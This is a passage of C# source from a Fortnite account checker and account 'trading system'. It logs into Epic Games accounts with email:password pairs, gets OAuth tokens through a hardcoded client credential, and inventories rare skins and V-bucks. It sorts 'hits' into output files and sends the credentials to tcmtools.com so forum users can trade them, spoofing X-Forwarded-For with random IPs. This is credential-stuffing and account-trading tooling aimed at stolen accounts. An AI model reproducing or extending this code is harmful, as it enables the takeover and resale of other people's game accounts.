            badaccounts = Path.Combine(folder, string.Format("Bad Checked By TCM's Skin Checker.txt", fileName));
            TWOFAaccounts = Path.Combine(folder, string.Format("TwoStep Accounts Checked By TCM's Skin Checker.txt", fileName));
            BlackKnight = Path.Combine(folder, string.Format("Black Knight Accounts Checked By TCM's Skin Checker.txt", fileName));
            CodenameELF = Path.Combine(folder, string.Format("odename ELF Accounts Checked By TCM's Skin Checker.txt", fileName));
            Crackshot = Path.Combine(folder, string.Format("Crackshot Accounts Checked By TCM's Skin Checker.txt", fileName));
            GhoulTrooper = Path.Combine(folder, string.Format("Ghoul Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            MerryMarauder = Path.Combine(folder, string.Format("Merry Marauder Accounts Checked By TCM's Skin Checker.txt", fileName));
            NogOps = Path.Combine(folder, string.Format("Nog Ops Accounts Checked By TCM's Skin Checker.txt", fileName));
            RedNosedRaider = Path.Combine(folder, string.Format("Red Nosed Raider Accounts Checked By TCM's Skin Checker.txt", fileName));
            OGSkullTrooper = Path.Combine(folder, string.Format("OG Skull Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            NoneOGSkullTrooper = Path.Combine(folder, string.Format("None OG Skull Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            YuletideRanger = Path.Combine(folder, string.Format("Yuletide Ranger Accounts Checked By TCM's Skin Checker.txt", fileName));
            Scythe = Path.Combine(folder, string.Format("Scythe Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveTheWorld = Path.Combine(folder, string.Format("Save The World Accounts Checked By TCM's Skin Checker.txt", fileName));
            Savevbucks = Path.Combine(folder, string.Format("Vbucks Accounts Checked By TCM's Skin Checker.txt", fileName));
            SavePCPlatform = Path.Combine(folder, string.Format("PC Accounts Checked By TCM's Skin Checker.txt", fileName));
            SavePS4Platform = Path.Combine(folder, string.Format("PS4 Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveXboxPlatform = Path.Combine(folder, string.Format("Xbox Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveNintendoPlatform = Path.Combine(folder, string.Format("Nintendo Accounts Checked By TCM's Skin Checker.txt", fileName));
            StackedAccounts = Path.Combine(folder, string.Format("Stacked Accounts Found By TCM's Skin Checker.txt", fileName));
            Royalebomber = Path.Combine(folder, string.Format("Royalebomber Found By TCM's Skin Checker.txt", fileName));
            Candyaxe = Path.Combine(folder, string.Format("Candyaxe Found By TCM's Skin Checker.txt", fileName));
            RenegadeSkin = Path.Combine(folder, string.Format("Renegade Found By TCM's Skin Checker.txt", fileName));
            AerialAssaultTrooper = Path.Combine(folder, string.Format("Aerial Assault Trooper Found By TCM's Skin Checker.txt", fileName));
            Raidersrevenge = Path.Combine(folder, string.Format("Raiders Revenge Found By TCM's Skin Checker.txt", fileName));
            PowerChord = Path.Combine(folder, string.Format("Power Chord Found By TCM's Skin Checker.txt", fileName));
            SgtGreenClover = Path.Combine(folder, string.Format("SGT. Green Clover Found By TCM's Skin Checker.txt", fileName));
            STWStandard = Path.Combine(folder, string.Format("STW Standard Edition Found By TCM's Skin Checker.txt", fileName));
            STWDelux = Path.Combine(folder, string.Format("STW Delux Edition Found By TCM's Skin Checker.txt", fileName));
            STWSDelux = Path.Combine(folder, string.Format("STW Super Delux Edition Found By TCM's Skin Checker.txt", fileName));
            STWLimited = Path.Combine(folder, string.Format("STW Limited Edition Found By TCM's Skin Checker.txt", fileName));
            STWUltimate = Path.Combine(folder, string.Format("STW Ultimate Edition Found By TCM's Skin Checker.txt", fileName));
            GalaxySkinFound = Path.Combine(folder, string.Format("Galaxy Skins Found By TCM's Skin Checker.txt", fileName));

            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.ClearAllHeaders();
                int ProxyTimeoutTimer = (int)ProxyTimeout.Value;
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                httpRequest.KeepAlive = true;
                httpRequest.Cookies = new CookieDictionary(false);
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.ConnectTimeout = ProxyTimeoutTimer;
                httpRequest.AllowAutoRedirect = false;
                string response = httpRequest.Get("https://www.epicgames.com/id/api/csrf").ToString();
                var value = httpRequest.Cookies["XSRF-TOKEN"];
                httpRequest.AddHeader("x-xsrf-token", value);
                string SingleAccountInfo = string.Format("email={0}&password={1}&rememberMe=False", Email, Password);
                string SingleAccountOath1 = httpRequest.Post("https://www.epicgames.com/id/api/login", SingleAccountInfo, "application/x-www-form-urlencoded").ToString();

                httpRequest.AddHeader("x-xsrf-token", value);
                string GetOath1 = httpRequest.Get("https://www.epicgames.com/id/api/redirect").ToString();
                httpRequest.AddHeader("x-xsrf-token", value);
                string GetOath2 = httpRequest.Get("https://www.epicgames.com/id/api/exchange").ToString();
                MessageBox.Show(GetOath2);
                JToken AccessToken = JObject.Parse(GetOath2)["code"];
                httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
                string OathThisShit = string.Format("grant_type=exchange_code&exchange_code=" + AccessToken + "&token_type=eg1");
                string SingleAccountOath = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", OathThisShit, "application/x-www-form-urlencoded").ToString();

                if (SingleAccountOath.Contains("access_token"))
                {
                    string SingleAccountString1 = Regex.Match(SingleAccountOath, "\"access_token\" : \"(.*?)\",").Groups[1].Value;
                    string SingleAccountString2 = Regex.Match(SingleAccountOath, "\"account_id\" : \"(.*?)\"").Groups[1].Value;
                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", SingleAccountString1));
                    string characters = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=athena&rvn=-1", SingleAccountString2), "{}", "application/json").ToString();
                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", SingleAccountString1));
                    string ExtraInfo = httpRequest.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=common_core&rvn=-1", SingleAccountString2), "{}", "application/json").ToString();
                    httpRequest.AddHeader("Authorization", string.Format("bearer {0}", SingleAccountString1));
                    string AccountDetails = httpRequest.Get(string.Format("https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/" + SingleAccountString2)).ToString();
                    
                    if (characters.Contains("profile"))
                    {
                        index = 0;
                        validcnt = 0;
                        invalidcnt = 0;
                        errorcnt = 0;
                        checkedcnt = 0;
                        retrycnt = 0;
                        rareskins = 0;
                        STW = 0;
                        Skully = 0;
                        RenegadeCount = 0;
                        VbucksFound = 0;
                        TotalSkinsChecked = 0;
                        TotalGlidersChecked = 0;
                        StandardSTW = 0;
                        OGSkullCount = 0;
                        NoobySkullTrooperAccounts = 0;
                        DeluxEditionSTW = 0;
                        SuperDeluxSTW = 0;
                        LimitedEditionSTWE = 0;
                        UltimateEditionSTWE = 0;
                        TotalGalaxyChecked = 0;
                        lockedCuz2Fa = 0;
                        FnBattleRoyalLB.Items.Clear();
                        IsUsingTradingSystem = true;
                        MainTabControl.SelectedTab = MainTabControl.TabPages["SkinCheckerPage"];
                        SaveData(Email + ":" + Password, characters, ExtraInfo, AccountDetails);
                        updatestatus();
                        IsUsingTradingSystem = false;
                        ReceivingPartyKey.Text = "";
                        ReceivingPartyKey.Enabled = true;

                    }
                    else
                    {
                        MessageBox.Show("The Account The Other Party Entered Seems To Be Bad, Give It Another Go?");
                        IsUsingTradingSystem = false;
                        ReceivingPartyKey.Text = "";
                        ReceivingPartyKey.Enabled = true;
                    }
                }
                else
                {
                    MessageBox.Show("The Account The Other Party Entered Seems To Be Bad, Give It Another Go?");
                    IsUsingTradingSystem = false;
                    ReceivingPartyKey.Text = "";
                    ReceivingPartyKey.Text = "";
                    ReceivingPartyKey.Enabled = true;
                }
            }
        }

        public string GetRandomIpAddress()
        {
            var random = new Random();
            return $"{random.Next(1, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}.{random.Next(0, 255)}";
        }

        private void GenerateAKeyButton_Click(object sender, EventArgs e)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                if (!AccountInfoSendingParty.Text.Contains(("@")))
                {
                    MessageBox.Show("Email Appears To Be Wrong, Please Input Correct Email Format!");
                    return;
                }
                if (!AccountInfoSendingParty.Text.Contains((":")))
                {
                    MessageBox.Show("Account Format Appears To Be Wrong, Please Fix It And try Again!");
                    return;
                }
                GenerateAKeyButton.Enabled = false;
                GenerateAKeyTextBox.Enabled = false;
                AccountInfoSendingParty.Enabled = false;
                int length = (int)GenerateAKeyNumber.Value;
                if (length < 20)
                {
                    MessageBox.Show("Key Must Be The Minumum Of 20 Please Try Again!");
                    GenerateAKeyNumber.Value = 20;
                    return;
                }
                string RandomKeyPart1 = GenerateRandomCryptographicKey(length / 4);
                string RandomKeyPart2 = GenerateRandomCryptographicKey(length / 4);
                string RandomKeyPart3 = GenerateRandomCryptographicKey(length / 4);
                string RandomKeyPart4 = GenerateRandomCryptographicKey(length / 4);
                string RandomKeyGeneration = RandomKeyPart1 + "-" + RandomKeyPart2 + "-" + RandomKeyPart3 + "-" + RandomKeyPart4;
                GenerateAKeyTextBox.Text = RandomKeyGeneration.ToString();
                string IPAddress1 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress1);
                string CheckUserData = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/TradingSystem.php?a=add-cpu&username=" + RandomKeyGeneration + "&cpu=" + AccountInfoSendingParty.Text + "&Key=" + IPAddress1).ToString();
                string IPAddress2 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress2);
                string LockUserToID = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/Lock/TradingSystemLock.php?a=add-cpu&username=" + RandomKeyGeneration + "&cpu=" + ForumUser.Text + "&Key=" + IPAddress2).ToString();
                string IPAddress3 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress3);
                string AddLockToRemoveFromDB = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/LockRemoveFromDB/TradingSystemLockRemoveFromDB.php?a=add-cpu&username=" + RandomKeyGeneration + "&cpu=" + ForumUser.Text + "&Key=" + IPAddress3).ToString();
                string IPAddress4 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress4);
                if(IsUserTradingAccount.Checked)
                {
                    string IsUserTradingAccountOrNot = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/IsTradingEnabled/TradingSystemIsTrading.php?a=add-cpu&username=" + RandomKeyGeneration + "&cpu=" + "True" + "&Key=" + IPAddress4).ToString();
                    string IPAddress5 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress5);
                    string IsAccountReleasedForTradingYet = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/TradingRelease/TradingSystemReleaseTrading.php?a=add-cpu&username=" + RandomKeyGeneration + "&cpu=" + "False" + "&Key=" + IPAddress5).ToString();
                }
                else if(!IsUserTradingAccount.Checked)
                {
                    string IsUserTradingAccountOrNot = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/IsTradingEnabled/TradingSystemIsTrading.php?a=add-cpu&username=" + RandomKeyGeneration + "&cpu=" + "False" + "&Key=" + IPAddress4).ToString();
                }
                try
                {
                    using (StreamWriter SaveKeysMade = File.AppendText("Trading System Keys Made.log"))
                    {
                        SaveKeysMade.WriteLine("==== Key Start Information ===");
                        SaveKeysMade.WriteLine((Environment.NewLine));
                        SaveKeysMade.WriteLine("Account Linked To Key: " + Environment.NewLine + AccountInfoSendingParty.Text);
                        SaveKeysMade.WriteLine((Environment.NewLine));
                        SaveKeysMade.WriteLine("Key Lnked To Account: " + Environment.NewLine + GenerateAKeyTextBox.Text);
                        SaveKeysMade.WriteLine((Environment.NewLine));
                        SaveKeysMade.WriteLine("Key Lenght: " + length.ToString());
                        SaveKeysMade.WriteLine((Environment.NewLine));
                        SaveKeysMade.WriteLine("==== Key End Information ===");
                        SaveKeysMade.WriteLine((Environment.NewLine));
                        SaveKeysMade.WriteLine((Environment.NewLine));
                    }
                }
                catch { }
                MessageBox.Show("Key Has Been Generated, Send The Key To Your Other Party!");
            }
        }

        private void nsButton8_Click_1(object sender, EventArgs e)
        {
            if(GenerateAKeyTextBox.Text == null || GenerateAKeyTextBox.Text == "")
            {
                MessageBox.Show("Cannot Copy Nothing, Give It Another Go, Maybe When A Key Has Been Generated?");
                return;
            }
            Clipboard.Clear();    //Clear if any old value is there in Clipboard       
            string KeyFinal = GenerateAKeyTextBox.Text;
            Clipboard.SetText(KeyFinal);
        }

        private void GrabReceivingParty_Click(object sender, EventArgs e)
        {
            try
            {
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    string IPAddress1 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress1);
                    string CheckUserData = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/TradingSystem.php?a=check-cpu&username=" + ReceivingPartyKey.Text + "&Key=" + IPAddress1).ToString();
                    if (CheckUserData.Contains("Sorry, Key Not Found!"))
                    {
                        MessageBox.Show("Key Does Not Exist, Please Make Sure The Key You Got Is Valid and has not been used before!");
                        IsUsingTradingSystem = false;
                        ReceivingPartyKey.Text = "";
                        ReceivingPartyKey.Enabled = true;
                        return;
                    }
                    if (CheckUserData == "ERROR BAD RESPONSE")
                    {
                        MessageBox.Show("Error, Please Contact TrynCatchMe ERROR CODE: 345345");
                        IsUsingTradingSystem = false;
                        ReceivingPartyKey.Text = "";
                        ReceivingPartyKey.Enabled = true;
                        return;
                    }
                    ReceivingPartyKey.Enabled = false;
                    string[] strArray = CheckUserData.Split(new char[3] { ';', ':', '|' });
                    MessageBox.Show("Will Now Show What Is On The Account Up For trade/Sell");
                    TradingAccountCheck(strArray[0], strArray[1]);
                }
               
            }
            catch
            {
                MessageBox.Show("ERROR: Had issues trying to grab the key information, Please Try Again Later!");
                IsUsingTradingSystem = false;
                ReceivingPartyKey.Text = "";
                ReceivingPartyKey.Enabled = true;
            }
        }

        private void nsButton29_Click(object sender, EventArgs e)
        {
            AccountInfoSendingParty.Enabled = true;
            AccountInfoSendingParty.Text = "";
            GenerateAKeyTextBox.Enabled = false;
            GenerateAKeyButton.Enabled = true;
            GenerateAKeyTextBox.Text = "";
        }

        private void nsButton31_Click(object sender, EventArgs e)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string IPAddress9 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress9);
                string IsUserTradingOrNot = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/IsTradingEnabled/TradingSystemIsTrading.php?a=check-cpu&username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress9).ToString();
                if (IsUserTradingOrNot == "True")
                {
                    MessageBox.Show("This Account Was Set For Trading Mode Only, There For Cannot Be Redeemed Here!");
                    return;
                }
                string IPAddress1 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress1);
                string IsUserAllowedToRedeem = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseTo.php?a=check-cpu&username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress1).ToString();
                if (IsUserAllowedToRedeem != ForumUser.Text.ToLower())
                {
                    MessageBox.Show("You Are Not Authed To Claim This Account!");
                    return;
                }
                //Need To Add The Check here To make Sure The Username Matches The Auth To Be Able To Retrieve Account Information.
                string IPAddress2 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress2);
                string GrabUserAccountInfo = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/TradingSystem.php?a=check-cpu&username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress2).ToString();
                string IPAddress3 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress3);
                string CheckUserData = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/Release/TradingSystemRecieve.php?a=check-cpu&username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress3).ToString();
                if (CheckUserData == "Account Has Yet To Be Released")
                {
                    MessageBox.Show("Other Party Has Not Released Account Yet.");
                    return;
                }
                else if (CheckUserData == "Account Has Been Released")
                {
                    MessageBox.Show("Account Will Now Be Shown/Released To You!");
                    string[] strArray = GrabUserAccountInfo.Split(new char[3] { ';', ':', '|' });
                    ReceivingEmailAddress.Text = strArray[0];
                    ReceivingPassword.Text = strArray[1];
                    string IPAddress4 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress4);
                    string RemoveuserData = httpRequest.Post("http://tcmtools.com/CheckerStuff/TradingSystem/TradingSystemRemove.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress4).ToString();
                    string IPAddress5 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress5);
                    string RemoveReleasedOrNot = httpRequest.Post("http://tcmtools.com/CheckerStuff/TradingSystem/Release/TradingSystemRecieveRemove.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress5).ToString();
                    string IPAddress6 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress6);
                    string RemoveLockToAccount = httpRequest.Post("http://tcmtools.com/CheckerStuff/TradingSystem/Lock/TradingSystemLockRemove.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress6).ToString();
                    string IPAddress7 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress7);
                    string RemoveAuthUserLock = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseToRemove.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress7).ToString();
                    string IPAddress8 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress8);
                    string RemoveLockToUserRemoveFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseToRemove.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress8).ToString();
                    string IPAddress10 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress10);
                    string RemoveIsTradingEnabledFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseTradingRemove.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress10).ToString();
                    string IPAddress11 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress11);
                    string RemoveTradingReleaseFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemIsTradingRemove.php.php?username=" + RecievingGeneratedKey.Text + "&Key=" + IPAddress11).ToString();
                }
                else
                {
                    MessageBox.Show("Error Grabbing Data");
                }
            }
        }

        private void RemoveAccountFromDB_Click(object sender, EventArgs e)
        {
            //NEED TO CONFIGURE DATABASE TO LOCK TO USERNAME IN ORDER TO REMOVE ACCOUNT
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string IPAddress1 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress1);
                string IsAllowedtoRemoveFromDB = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/LockRemoveFromDB/TradingSystemLockRemoveFromDB.php?a=check-cpu&username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress1).ToString();
                if (IsAllowedtoRemoveFromDB == "No Lock Because Doesn't Exist.")
                {
                    MessageBox.Show("Cannot Find Key, Because It Cannot Be Found!");
                    return;
                }
                if (IsAllowedtoRemoveFromDB != ForumUser.Text)
                {
                    MessageBox.Show("You Are Not Authed To Remove This Key From The DB.");
                    return;
                }
                string IPAddress2 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress2);
                string RemoveuserData = httpRequest.Post("http://tcmtools.com/CheckerStuff/TradingSystem/TradingSystemRemove.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress2).ToString();
                string IPAddress3 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress3);
                string RemoveReleasedOrNot = httpRequest.Post("http://tcmtools.com/CheckerStuff/TradingSystem/Release/TradingSystemRecieveRemove.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress3).ToString();
                string IPAddress4 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress4);
                string RemoveLockToAccount = httpRequest.Post("http://tcmtools.com/CheckerStuff/TradingSystem/Lock/TradingSystemLockRemove.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress4).ToString();
                string IPAddress5 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress5);
                string RemoveLockToRemoveFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/LockRemoveFromDB/TradingSystemLockRemoveFromDBRemove.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress5).ToString();
                string IPAddress6 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress6);
                string RemoveLockToUserRemoveFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseToRemove.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress6).ToString();
                string IPAddress7 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress7);
                string RemoveIsTradingEnabledFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseTradingRemove.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress7).ToString();
                string IPAddress8 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress8);
                string RemoveTradingReleaseFromDB = httpRequest.Post("http://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseToRemove.php.php?username=" + ManuallyRemoveFromDB.Text + "&Key=" + IPAddress8).ToString();
                MessageBox.Show("Account Successfully Removed From DB");
            }
        }

        private void nsButton30_Click(object sender, EventArgs e)
        {
            //Need To Add In here Username To Auth To Be Able To use
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string IPAddress1 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress1);
                string IsUserAllowedToRelease = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/Lock/TradingSystemLock.php?a=check-cpu&username=" + ReleaseAccountKey.Text + "&Key=" + IPAddress1).ToString();
                if (IsUserAllowedToRelease == "No Lock Because Doesn't Exist.")
                {
                    MessageBox.Show("The Code You Are Trying To Release Does Not Exist.");
                }
                else if (IsUserAllowedToRelease == ForumUser.Text)
                {
                    string IPAddress2 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress2);
                    string ReleaseAccountGoesTrue = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/Release/TradingSystemRecieve.php?a=add-cpu&username=" + ReleaseAccountKey.Text + "&cpu=Account Has Been Released" + "&Key=" + IPAddress2).ToString();
                    string IPAddress3 = GetRandomIpAddress();
                    httpRequest.AddHeader("X-Forwarded-For", IPAddress3);
                    string LockToOneUserUsing = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseTo.php?a=add-cpu&username=" + ReleaseAccountKey.Text + "&cpu=" + UsernameToAuthAccountFor.Text.ToLower() + "&Key=" + IPAddress3).ToString();
                    if(IsUserTradingAccount.Checked)
                    {
                        string IPAddress4 = GetRandomIpAddress();
                        httpRequest.AddHeader("X-Forwarded-For", IPAddress4);
                        string RemoveOldReleaseAccount = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/TradingRelease/TradingSystemReleaseTradingRemove.php?username=" + ReleaseAccountKey.Text + "&Key=" + IPAddress4).ToString();
                        string IPAddress5 = GetRandomIpAddress();
                        httpRequest.AddHeader("X-Forwarded-For", IPAddress5);
                        string IsAccountReleasedForTradingYet = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/TradingRelease/TradingSystemReleaseTrading.php?a=add-cpu&username=" + ReleaseAccountKey.Text + "&cpu=" + "True" + "&Key=" + IPAddress5).ToString();

                    }
                    MessageBox.Show("The Account Has Now Been Released! Tell Other Party To Claim.");
                }
                else
                {
                    MessageBox.Show("You Are NOT Authed To Release This Account.");
                }
            }
        }

        private void DisplayOldKeysButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists("Trading System Keys Made.log"))
            {
                MessageBox.Show("No Previously Saved Keys Found, Sorry!");
                return;
            }
            string PreviousFile = File.ReadAllText("Trading System Keys Made.log");
            if(PreviousFile == null || PreviousFile == "")
            {
                MessageBox.Show("File SeemS To Be Empty, Sorry!");
                return;
            }
            OldKeyDisplayBox.Text = null;
            OldKeyDisplayBox.Text = PreviousFile;
        }

        private void nsButton32_Click(object sender, EventArgs e)
        {
            if (!File.Exists("Trading System Keys Made.log"))
            {
                MessageBox.Show("No Previously Saved Keys Found, Sorry!");
                return;
            }
            if (File.Exists("Trading System Keys Made.log"))
            {
                OldKeyDisplayBox.Text = null;
                File.Delete("Trading System Keys Made.log");
            }
        }

        private void nsButton33_Click(object sender, EventArgs e)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string IPAddress1 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress1);
                string IsUser1Trading = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/IsTradingEnabled/TradingSystemIsTrading.php?a=check-cpu&username=" + OtherPartiesKey.Text + "&Key=" + IPAddress1).ToString();
                string IPAddress2 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress2);
                string IsUser2Trading = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/IsTradingEnabled/TradingSystemIsTrading.php?a=check-cpu&username=" + YourKeyBox.Text + "&Key=" + IPAddress2).ToString();
                if (IsUser1Trading != "True" || IsUser1Trading != "True")
                {
                    MessageBox.Show("Doesn't Look Like Both Users Chose The Trade Option!");
                    return;
                }
                string IPAddress3 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress3);
                string CheckIfUserReleased1 = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/TradingRelease/TradingSystemReleaseTrading.php?a=check-cpu&username=" + OtherPartiesKey.Text + "&Key=" + IPAddress3).ToString();
                string IPAddress4 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress4);
                string CheckIfUserReleased2 = httpRequest.Post("https://tcmtools.com//CheckerStuff/TradingSystem/TradingRelease/TradingSystemReleaseTrading.php?a=check-cpu&username=" + YourKeyBox.Text + "&Key=" + IPAddress4).ToString();
                if (CheckIfUserReleased1 != "True" || CheckIfUserReleased2 != "True")
                {
                    MessageBox.Show("It seems as though both users have not released there accounts yet, Try again later.");
                    return;
                }
                string IPAddress5 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress5);
                string IsUserAllowedToRedeem = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/ReleaseTo/TradingSystemReleaseTo.php?a=check-cpu&username=" + OtherPartiesKey.Text + "&Key=" + IPAddress5).ToString();
                if (IsUserAllowedToRedeem != ForumUser.Text.ToLower())
                {
                    MessageBox.Show("The User Did Not Auth You To Redeem This Account!");
                    return;
                }
                MessageBox.Show("Account Will Now Be Shown/Released To You!");
                string IPAddress6 = GetRandomIpAddress();
                httpRequest.AddHeader("X-Forwarded-For", IPAddress6);
                string GrabUserAccountInfo = httpRequest.Post("https://tcmtools.com/CheckerStuff/TradingSystem/TradingSystem.php?a=check-cpu&username=" + OtherPartiesKey.Text + "&Key=" + IPAddress6).ToString();
                string[] strArray = GrabUserAccountInfo.Split(new char[3] { ';', ':', '|' });
                TradingKeyEmail.Text = strArray[0];
                TradingKeyPassword.Text = strArray[1];
            }
        }


        private void nsButton7_Click_2(object sender, EventArgs e)
        {
            Process.Start("https://tcmtools.com");
        }

        private void nsButton5_Click(object sender, EventArgs e)
        {
            Process.Start("https://tcmtools.com/community/index.php?account/upgrades");
        }

        private void LogoutButton_Click_1(object sender, EventArgs e)
        {
            LogoutButton.Visible = false;
            nsButton3.Visible = true;
            nsButton5.Visible = true;
            nsButton7.Visible = true;
            enterprogram = false;
            nsButton3.Enabled = true;
            ForumUser.Enabled = true;
        }

        private void ShareAccountsOnForum_Click(object sender, EventArgs e)
        {
            if (SharingDisabled == true)
            {
                MessageBox.Show("Can Only Share Once Every 5 Minutes!");
            }
            else
            {
                Thread StartSharingFortniteAccounts = new Thread(ShareFortniteAccounts);
                CheckForIllegalCrossThreadCalls = false;
                StartSharingFortniteAccounts.Start();
            }
        }

        private void ShareFortniteAccounts()
        {
            MessageBox.Show("Disabled Till Further Notice...");
                return;
            DialogResult dialogResult = MessageBox.Show("Are You Sure You Would Like To Post All Your Hits You Have Gotten This Session?", "WAIT! ARE YOU SURE!", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                Thread DisabledSharing = new Thread(DisableSharing);
                CheckForIllegalCrossThreadCalls = false;
                DisabledSharing.Start();
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    try
                    {
